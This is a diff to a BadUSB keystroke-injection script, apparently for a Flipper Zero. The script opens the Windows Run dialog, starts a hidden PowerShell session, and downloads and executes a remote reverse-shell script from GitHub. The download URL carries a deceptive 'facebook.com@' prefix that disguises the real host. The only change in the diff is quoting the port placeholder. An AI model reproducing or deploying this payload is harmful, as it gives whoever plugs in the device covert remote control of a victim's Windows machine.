@@ -1,4 +1,4 @@
 GUI r
 DELAY 1500
-STRING powershell -W hidden -noni -nop -c "$ip='IP_ADDRESS';$p=PORT_NUMBER;(iwr 'https://facebook.com@raw.githubusercontent.com/mkrksec/FlipperZero/main/BadUSB/Windows/ReverseShell/kamikadze.txt' -UseBasicParsing).Content | iex"
+STRING powershell -W hidden -noni -nop -c "$ip='IP_ADDRESS';$p='PORT_NUMBER';(iwr 'https://facebook.com@raw.githubusercontent.com/mkrksec/FlipperZero/main/BadUSB/Windows/ReverseShell/kamikadze.txt' -UseBasicParsing).Content | iex"
 ENTER
